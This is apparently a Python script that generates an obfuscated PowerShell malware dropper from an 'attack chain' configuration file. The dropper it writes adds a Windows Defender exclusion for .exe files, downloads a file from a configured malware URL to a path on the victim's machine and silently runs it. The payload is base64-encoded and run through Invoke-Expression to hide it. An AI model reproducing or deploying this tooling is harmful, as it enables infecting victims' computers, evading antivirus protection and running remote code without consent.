import base64
import os, sys
import json

decode_text_function = '''function db64 { [CmdletBinding()] param([Parameter(Mandatory=$true)] [string]$EncodedString) [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedString))};'''
variable_name = "$et = "
function_call_and_ps_execution = '''$dt = db64 $et; Invoke-Expression $dt'''


def create_decoded_dropper(malware_download_url, victim_download_path):
    if "C:\\Users".lower() in victim_download_path.lower():
        temp = victim_download_path[10:]
        idx = temp.index("\\")
        victim_download_path = victim_download_path[0:9] +"\"+$env:UserName+\""+temp[idx:]
    dropper_contents = '''[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionExtension ".exe"; $DownloadURL = "''' + malware_download_url +'''"; $FilePath = "'''+victim_download_path+'''"; try {Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing -OutFile $FilePath -ErrorAction Stop} catch {}; $FilePath = '"'+$FilePath+'"'; try {Start-Process -FilePath $FilePath -NoNewWindow} catch {}'''
    f = open("decoded_dropper.ps1", "w")
    f.write(dropper_contents)
    f.close()

def convert_file_to_base64(decoded_filename):
    try:
        with open(decoded_filename, "rb") as file:
            file_contents = file.read()
        base64_encoded = base64.b64encode(file_contents)
        base64_encoded_str = base64_encoded.decode("utf-8")
        return "\""+base64_encoded_str+"\"; "
    except Exception as e:
        print("ERROR: ", e)
        usage_details()


def write_to_file(dropper_filename):
    b64_convert = convert_file_to_base64("decoded_dropper.ps1")
    file_contents = decode_text_function + variable_name + b64_convert + function_call_and_ps_execution
    f = open(dropper_filename, "w")
    f.write(file_contents)
    f.close()
    print("\nFile: enc_dropper.ps1 --> Written")


def parse_config_file(config_path):
    f = open(config_path)
    data = json.load(f)
    
    ac = data["attack chain"]
    malware_download_url = ac["dropper"]["malware_download_url"]
    victim_download_path = ac["dropper"]["victim_download_path"]
    dropper_filename = ac["dropper"]["dropper_filename"]
    return (malware_download_url, victim_download_path, dropper_filename)


def usage_details():
    print("Usage Example 1: python3 generate_enc_dropper.py <attack chain config path>\n")


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("CMD Line Args Error")
        usage_details()
        sys.exit()
    
    if not os.path.exists(sys.argv[1]):
        print("Attack Chain Config File Path Not Found")
        usage_details()
        sys.exit()
    
    (malware_download_url, victim_download_path, dropper_filename) = parse_config_file(sys.argv[1])
    create_decoded_dropper(malware_download_url, victim_download_path)
    write_to_file(dropper_filename)